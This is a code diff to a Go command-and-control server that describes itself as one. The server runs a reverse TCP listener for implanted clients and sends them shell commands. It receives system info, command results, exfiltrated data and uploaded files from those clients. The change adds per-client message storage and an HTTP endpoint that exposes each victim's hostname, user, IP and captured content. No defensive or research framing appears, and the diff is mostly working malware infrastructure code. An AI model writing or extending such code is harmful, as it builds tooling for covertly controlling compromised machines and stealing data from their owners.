@@ -49,6 +49,14 @@ type InternalMessage struct {
 	Data   []byte
 }
 
+type ClientMessage struct {
+	Timestamp time.Time `json:"timestamp"`
+	Type      string    `json:"type"`
+	MessageID uint32    `json:"message_id"`
+	Content   string    `json:"content"`
+	DataSize  int       `json:"data_size"`
+}
+
 type Client struct {
 	ID         string
 	Conn       net.Conn
@@ -56,13 +64,14 @@ type Client struct {
 	SystemInfo SystemInfo
 	IPAddress  string
 	IsActive   bool
+	Messages   []ClientMessage // Store messages for this client
 }
 
 type SystemInfo struct {
-	Hostname string
-	OS       string
-	Arch     string
-	User     string
+	Hostname string `json:"hostname"`
+	OS       string `json:"os"`
+	Arch     string `json:"arch"`
+	User     string `json:"user"`
 }
 
 // Enable CORS for web interface
@@ -117,6 +126,41 @@ func main() {
 		clientsMutex.Unlock()
 
 		json.NewEncoder(w).Encode(clientList)
+	})
+
+	// Get messages from a specific client
+	http.HandleFunc("/get-client-messages", func(w http.ResponseWriter, r *http.Request) {
+		enableCORS(&w, r)
+
+		clientID := r.URL.Query().Get("client")
+		if clientID == "" {
+			http.Error(w, "Client ID required", http.StatusBadRequest)
+			return
+		}
+
+		clientsMutex.Lock()
+		client, exists := clients[clientID]
+		clientsMutex.Unlock()
+
+		if !exists {
+			json.NewEncoder(w).Encode(map[string]string{
+				"error": "Client not found",
+			})
+			return
+		}
+
+		// Return client info + messages
+		response := map[string]interface{}{
+			"client": map[string]interface{}{
+				"id":          client.ID,
+				"ip_address":  client.IPAddress,
+				"last_seen":   client.LastSeen,
+				"system_info": client.SystemInfo,
+			},
+			"messages": client.Messages,
+		}
+
+		json.NewEncoder(w).Encode(response)
 	})
 
 	// Send command to client using EXECUTE_COMMAND message type
@@ -372,7 +416,7 @@ func main() {
 		json.NewEncoder(w).Encode(client.SystemInfo)
 	})
 
-	log.Println("C2 Server with Correct Message Types running on :8080")
+	log.Println("C2 Server with Message Storage running on :8080")
 	log.Fatal(http.ListenAndServe(":8080", nil))
 }
 
@@ -413,6 +457,7 @@ func startReverseTCPListener(port int) {
 			LastSeen:  time.Now(),
 			IPAddress: clientAddr,
 			IsActive:  true,
+			Messages:  make([]ClientMessage, 0),
 		}
 
 		log.Printf("New client connected: %s from %s", client.ID, clientAddr)
@@ -486,33 +531,57 @@ func parseBinaryMessage(data []byte) (*InternalMessage, error) {
 }
 
 func processClientMessage(client *Client, msg *InternalMessage) {
+	// Create message record
+	clientMessage := ClientMessage{
+		Timestamp: time.Now(),
+		MessageID: msg.Header.MessageID,
+		DataSize:  len(msg.Data),
+		Content:   string(msg.Data),
+	}
+
 	switch msg.Header.MessageType {
 	case MESSAGE_HANDSHAKE:
+		clientMessage.Type = "HANDSHAKE"
 		log.Printf("Handshake from client %s", client.ID)
 		sendWelcomeMessage(client)
 
 	case MESSAGE_HEARTBEAT:
+		clientMessage.Type = "HEARTBEAT"
 		log.Printf("Heartbeat from client %s", client.ID)
-		// You can send ACK if needed
 
 	case MESSAGE_SYS_INFO:
+		clientMessage.Type = "SYS_INFO"
 		log.Printf("System info from client %s: %d bytes", client.ID, len(msg.Data))
-		// Parse system info based on your C++ client's format
 
 	case MESSAGE_COMMAND_RESULT:
-		log.Printf("Command result from client %s:\n%s", client.ID, string(msg.Data))
+		clientMessage.Type = "COMMAND_RESULT"
+		log.Printf("Command result from client %s (ID: %d):\n%s",
+			client.ID, msg.Header.MessageID, string(msg.Data))
 
 	case MESSAGE_DATA_EXFIL:
+		clientMessage.Type = "DATA_EXFIL"
 		log.Printf("Data exfiltration from client %s: %d bytes", client.ID, len(msg.Data))
 		saveExfilData(client.ID, msg.Data)
 
 	case MESSAGE_UPLOAD_FILE:
+		clientMessage.Type = "FILE_UPLOAD"
 		log.Printf("File upload from client %s: %d bytes", client.ID, len(msg.Data))
 		saveUploadedFile(client.ID, msg.Data)
 
 	case MESSAGE_ERROR_REPORT:
+		clientMessage.Type = "ERROR_REPORT"
 		log.Printf("Error report from client %s: %s", client.ID, string(msg.Data))
 	}
+
+	// Store the message
+	clientsMutex.Lock()
+	client.Messages = append(client.Messages, clientMessage)
+
+	// Keep only last 100 messages to prevent memory issues
+	if len(client.Messages) > 100 {
+		client.Messages = client.Messages[1:]
+	}
+	clientsMutex.Unlock()
 }
 
 func sendBinaryMessage(client *Client, msg InternalMessage) error {
@@ -557,12 +626,12 @@ func generateMessageID() uint32 {
 
 func saveExfilData(clientID string, data []byte) {
 	filename := fmt.Sprintf("exfil-%s-%d.bin", clientID, time.Now().Unix())
-	// Save implementation
-	log.Printf("Saved exfil data to %s", filename)
+	// Save to file implementation
+	log.Printf("Saved exfil data to %s (%d bytes)", filename, len(data))
 }
 
 func saveUploadedFile(clientID string, data []byte) {
 	filename := fmt.Sprintf("upload-%s-%d.bin", clientID, time.Now().Unix())
-	// Save implementation
-	log.Printf("Saved uploaded file to %s", filename)
+	// Save to file implementation
+	log.Printf("Saved uploaded file to %s (%d bytes)", filename, len(data))
 }
